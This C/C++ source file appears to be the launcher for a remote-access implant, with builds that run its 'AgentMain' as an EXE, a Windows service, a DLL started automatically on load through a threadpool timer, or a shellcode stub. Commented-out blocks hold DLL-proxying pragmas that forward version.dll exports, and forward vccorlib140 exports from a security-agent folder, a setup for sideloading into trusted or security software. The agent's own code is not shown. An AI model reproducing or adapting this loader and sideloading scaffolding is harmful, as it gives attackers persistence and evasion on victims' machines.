#include "main.h"
#include "config.h"


#if defined(DEBUG_EXE)


int main(int argc, char** argv) {

 
    AgentMain();
    return 0;
}

#elif defined(BUILD_SVC)

SERVICE_STATUS        ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

void ServiceMain(int argc, char** argv)
{
    CHAR* SvcName = getServiceName();
    hStatus = RegisterServiceCtrlHandlerA(SvcName, (LPHANDLER_FUNCTION)ControlHandler);
    if (!hStatus)
        return;

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    AgentMain();

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
}

void ControlHandler(DWORD request)
{
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    default:
        break;
    }

    SetServiceStatus(hStatus, &ServiceStatus);
}

int main()
{
    SERVICE_TABLE_ENTRYA ServiceTable[2];
    CHAR* SvcName = getServiceName();
    ServiceTable[0].lpServiceName = (LPSTR)SvcName;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcherA(ServiceTable);

    return 0;
}

#elif defined(BUILD_DLL)



//#pragma once

 
//topoedit
//extern "C" extern "C" __declspec(dllexport) void TEDCreateDataLoader() {}
//extern "C" extern "C" __declspec(dllexport) void TEDCreateDataSaver() {}
//extern "C" extern "C" __declspec(dllexport) void TEDCreateMediaTypeViewer() {}
//extern "C" extern "C" __declspec(dllexport) void TEDCreateTopoViewer() {}
//extern "C" extern "C" __declspec(dllexport) void TEDCreateTopoViewerWindow() {}
//extern "C" extern "C" __declspec(dllexport) void TEDGetAttributeCategory() {}
//extern "C" extern "C" __declspec(dllexport) void TEDGetAttributeGUID() {}
//extern "C" extern "C" __declspec(dllexport) void TEDGetAttributeListLength() {}
//extern "C" extern "C" __declspec(dllexport) void TEDGetAttributeName() {}
//extern "C" extern "C" __declspec(dllexport) void TEDGetAttributeType() {}
//extern "C" extern "C" __declspec(dllexport) void TEDGetAttributeTypeFromGUID() {}
//extern "C" extern "C" __declspec(dllexport) void TEDGetMTKnownAttributes() {}
//extern "C" extern "C" __declspec(dllexport) void TEDGetMTKnownGUIDStrings() {}
//extern "C" extern "C" __declspec(dllexport) void TEDMTStringFromGUID() {}
//extern "C" __declspec(dllexport) void GetVersions()
//{
//    AgentMain();
//       
//}
//
//BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
//{
//    switch (ul_reason_for_call) {
//    case DLL_PROCESS_ATTACH:
//        DisableThreadLibraryCalls(hModule);
//        QueueUserAPC((PAPCFUNC)GetVersions, GetCurrentThread(), NULL);
//        break;
//    case DLL_PROCESS_DETACH:
//        break;
//    case DLL_THREAD_ATTACH:
//        break;
//    case DLL_THREAD_DETACH:
//        break;
//    }
//    return TRUE;
//}
//
//
//
//#pragma comment(linker,"/export:GetFileVers ionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
//#pragma comment(linker,"/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle,@2")
//#pragma comment(linker,"/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.GetFileVersionInfoExA,@3")
//#pragma comment(linker,"/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.GetFileVersionInfoExW,@4")
//#pragma comment(linker,"/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA,@5")
//#pragma comment(linker,"/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExA,@6")
//#pragma comment(linker,"/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExW,@7")
//#pragma comment(linker,"/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW,@8")
//#pragma comment(linker,"/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@9")
//#pragma comment(linker,"/export:VerFindFileA=C:\\Windows\\System32\\version.VerFindFileA,@10")
//#pragma comment(linker,"/export:VerFindFileW=C:\\Windows\\System32\\version.VerFindFileW,@11")
//#pragma comment(linker,"/export:VerInstallFileA=C:\\Windows\\System32\\version.VerInstallFileA,@12")
//#pragma comment(linker,"/export:VerInstallFileW=C:\\Windows\\System32\\version.VerInstallFileW,@13")
//#pragma comment(linker,"/export:VerLanguageNameA=C:\\Windows\\System32\\version.VerLanguageNameA,@14")
//#pragma comment(linker,"/export:VerLanguageNameW=C:\\Windows\\System32\\version.VerLanguageNameW,@15")
//#pragma comment(linker,"/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA,@16")
//#pragma comment(linker,"/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW,@17")


//
//#pragma once
//#pragma comment(linker,"/export:_CreateFrameInfo=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._CreateFrameInfo,@1\"")
//#pragma comment(linker,"/export:_CxxThrowException=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._CxxThrowException,@2\"")
//#pragma comment(linker,"/export:_FindAndUnlinkFrame=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._FindAndUnlinkFrame,@3\"")
//#pragma comment(linker,"/export:_IsExceptionObjectToBeDestroyed=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._IsExceptionObjectToBeDestroyed,@4\"")
//#pragma comment(linker,"/export:_SetWinRTOutOfMemoryExceptionCallback=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._SetWinRTOutOfMemoryExceptionCallback,@5\"")
//#pragma comment(linker,"/export:__AdjustPointer=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__AdjustPointer,@6\"")
//#pragma comment(linker,"/export:__BuildCatchObject=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__BuildCatchObject,@7\"")
//#pragma comment(linker,"/export:__BuildCatchObjectHelper=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__BuildCatchObjectHelper,@8\"")
//#pragma comment(linker,"/export:__C_specific_handler=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__C_specific_handler,@9\"")
//#pragma comment(linker,"/export:__C_specific_handler_noexcept=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__C_specific_handler_noexcept,@10\"")
//#pragma comment(linker,"/export:__CxxDetectRethrow=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__CxxDetectRethrow,@11\"")
//#pragma comment(linker,"/export:__CxxExceptionFilter=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__CxxExceptionFilter,@12\"")
//#pragma comment(linker,"/export:__CxxFrameHandler=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__CxxFrameHandler,@13\"")
//#pragma comment(linker,"/export:__CxxFrameHandler2=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__CxxFrameHandler2,@14\"")
//#pragma comment(linker,"/export:__CxxFrameHandler3=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__CxxFrameHandler3,@15\"")
//#pragma comment(linker,"/export:__CxxQueryExceptionSize=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__CxxQueryExceptionSize,@16\"")
//#pragma comment(linker,"/export:__CxxRegisterExceptionObject=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__CxxRegisterExceptionObject,@17\"")
//#pragma comment(linker,"/export:__CxxUnregisterExceptionObject=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__CxxUnregisterExceptionObject,@18\"")
//#pragma comment(linker,"/export:__DestructExceptionObject=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__DestructExceptionObject,@19\"")
//#pragma comment(linker,"/export:__FrameUnwindFilter=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__FrameUnwindFilter,@20\"")
//#pragma comment(linker,"/export:__GetPlatformExceptionInfo=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__GetPlatformExceptionInfo,@21\"")
//#pragma comment(linker,"/export:__NLG_Dispatch2=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__NLG_Dispatch2,@22\"")
//#pragma comment(linker,"/export:__NLG_Return2=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__NLG_Return2,@23\"")
//#pragma comment(linker,"/export:__RTCastToVoid=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__RTCastToVoid,@24\"")
//#pragma comment(linker,"/export:__RTDynamicCast=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__RTDynamicCast,@25\"")
//#pragma comment(linker,"/export:__RTtypeid=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__RTtypeid,@26\"")
//#pragma comment(linker,"/export:__TypeMatch=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__TypeMatch,@27\"")
//#pragma comment(linker,"/export:__current_exception=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__current_exception,@28\"")
//#pragma comment(linker,"/export:__current_exception_context=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__current_exception_context,@29\"")
//#pragma comment(linker,"/export:__intrinsic_setjmp=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__intrinsic_setjmp,@30\"")
//#pragma comment(linker,"/export:__intrinsic_setjmpex=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__intrinsic_setjmpex,@31\"")
//#pragma comment(linker,"/export:__processing_throw=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__processing_throw,@32\"")
//#pragma comment(linker,"/export:__report_gsfailure=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__report_gsfailure,@33\"")
//#pragma comment(linker,"/export:__std_exception_copy=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__std_exception_copy,@34\"")
//#pragma comment(linker,"/export:__std_exception_destroy=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__std_exception_destroy,@35\"")
//#pragma comment(linker,"/export:__std_terminate=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__std_terminate,@36\"")
//#pragma comment(linker,"/export:__std_type_info_compare=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__std_type_info_compare,@37\"")
//#pragma comment(linker,"/export:__std_type_info_destroy_list=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__std_type_info_destroy_list,@38\"")
//#pragma comment(linker,"/export:__std_type_info_hash=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__std_type_info_hash,@39\"")
//#pragma comment(linker,"/export:__std_type_info_name=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__std_type_info_name,@40\"")
//#pragma comment(linker,"/export:__telemetry_main_invoke_trigger=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__telemetry_main_invoke_trigger,@41\"")
//#pragma comment(linker,"/export:__telemetry_main_return_trigger=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__telemetry_main_return_trigger,@42\"")
//#pragma comment(linker,"/export:__unDName=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__unDName,@43\"")
//#pragma comment(linker,"/export:__unDNameEx=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__unDNameEx,@44\"")
//#pragma comment(linker,"/export:__uncaught_exception=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__uncaught_exception,@45\"")
//#pragma comment(linker,"/export:__uncaught_exceptions=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__uncaught_exceptions,@46\"")
//#pragma comment(linker,"/export:__vcrt_GetModuleFileNameW=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__vcrt_GetModuleFileNameW,@47\"")
//#pragma comment(linker,"/export:__vcrt_GetModuleHandleW=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__vcrt_GetModuleHandleW,@48\"")
//#pragma comment(linker,"/export:__vcrt_InitializeCriticalSectionEx=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__vcrt_InitializeCriticalSectionEx,@49\"")
//#pragma comment(linker,"/export:__vcrt_LoadLibraryExW=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.__vcrt_LoadLibraryExW,@50\"")
//#pragma comment(linker,"/export:_get_purecall_handler=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._get_purecall_handler,@51\"")
//#pragma comment(linker,"/export:_get_unexpected=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._get_unexpected,@52\"")
//#pragma comment(linker,"/export:_is_exception_typeof=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._is_exception_typeof,@53\"")
//#pragma comment(linker,"/export:_local_unwind=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._local_unwind,@54\"")
//#pragma comment(linker,"/export:_purecall=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._purecall,@55\"")
//#pragma comment(linker,"/export:_set_purecall_handler=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._set_purecall_handler,@56\"")
//#pragma comment(linker,"/export:_set_se_translator=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140._set_se_translator,@57\"")
//#pragma comment(linker,"/export:longjmp=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.longjmp,@58\"")
//#pragma comment(linker,"/export:memchr=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.memchr,@59\"")
//#pragma comment(linker,"/export:memcmp=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.memcmp,@60\"")
//#pragma comment(linker,"/export:memcpy=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.memcpy,@61\"")
//#pragma comment(linker,"/export:memmove=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.memmove,@62\"")
//#pragma comment(linker,"/export:memset=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.memset,@63\"")
//#pragma comment(linker,"/export:set_unexpected=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.set_unexpected,@64\"")
//#pragma comment(linker,"/export:strchr=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.strchr,@65\"")
//#pragma comment(linker,"/export:strrchr=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.strrchr,@66\"")
//#pragma comment(linker,"/export:strstr=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.strstr,@67\"")
//#pragma comment(linker,"/export:unexpected=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.unexpected,@68\"")
//#pragma comment(linker,"/export:wcschr=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.wcschr,@69\"")
//#pragma comment(linker,"/export:wcsrchr=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.wcsrchr,@70\"")
//#pragma comment(linker,"/export:wcsstr=\"C:\\ProgramData\\Deep Security Agent\\vccorlib140.wcsstr,@71\"")
// 
// 
// 
//extern "C" __declspec(dllexport) void GetVersions()
//{
//    AgentMain();
//       
//}
//BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
//{
//    switch (ul_reason_for_call) {
//    case DLL_PROCESS_ATTACH:
//        QueueUserAPC((PAPCFUNC)GetVersions, GetCurrentThread(), NULL);
//        break;
//    case DLL_PROCESS_DETACH:
//        break;
//    case DLL_THREAD_ATTACH:
//        break;
//    case DLL_THREAD_DETACH:
//        break;
//    }
//    return TRUE;
//}


#define _WIN32_WINNT 0x0600
#include <threadpoolapiset.h>

// Global synchronization primitives
static volatile LONG g_AgentInitialized = FALSE;
static volatile LONG g_LockInitialized = FALSE;
static CRITICAL_SECTION g_InitLock;

// Initialize critical section during DLL load
void InitializeSynchronization()
{
    if (InterlockedCompareExchange(&g_LockInitialized, TRUE, FALSE) == FALSE)
        InitializeCriticalSection(&g_InitLock);
}

// Internal function to run agent with proper synchronization
void run()
{
    // Initialize synchronization if needed
    InitializeSynchronization();

    // Attempt to acquire initialization ownership
    if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
        // Create agent thread without blocking

        
       // MessageBoxA(NULL, " DLL Loaded", "APC", MB_OK | MB_ICONINFORMATION);
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AgentMain, NULL, 0, NULL);

        if (hThread)
            CloseHandle(hThread); // Detach thread for asynchronous execution
        else
            InterlockedExchange(&g_AgentInitialized, FALSE); // Reset flag on failure to allow retry
    }
}

extern "C" __declspec(dllexport) void CALLBACK GetVersions(/*HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow*/)
{
    // Mark as directly called to prevent automatic execution
    InitializeSynchronization();
    MessageBoxA(NULL, " DLL Loaded GetVersions", "APC", MB_OK | MB_ICONINFORMATION);
    if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AgentMain, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE); // Wait for thread completion when called directly
            CloseHandle(hThread);
        }
    }
}

VOID CALLBACK InitializationCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer)
{
    // Execute initialization without loader lock constraints
    CloseThreadpoolTimer(Timer);
    run();
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    {
        // Initialize synchronization on first load
        InitializeSynchronization();

        // Create scope block to contain variable declarations
        PTP_TIMER timer = CreateThreadpoolTimer(InitializationCallback, NULL, NULL);
        if (timer) {
            FILETIME dueTime = { 0 };
            SetThreadpoolTimer(timer, &dueTime, 0, 0);
        }
        break;
    }
    case DLL_PROCESS_DETACH:
        // Cleanup if loader allows
        if (!lpReserved && g_LockInitialized)
            DeleteCriticalSection(&g_InitLock);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}


#elif defined(BUILD_SHELLCODE)

extern "C" __declspec(dllexport) void GetVersions() {};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    AgentMain();
    return TRUE;
}
#else

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
//{
//    
//    AgentMain();
//    return 0;
//}
//

int main(int argc, char** argv) {


    AgentMain();
    return 0;
}



#endif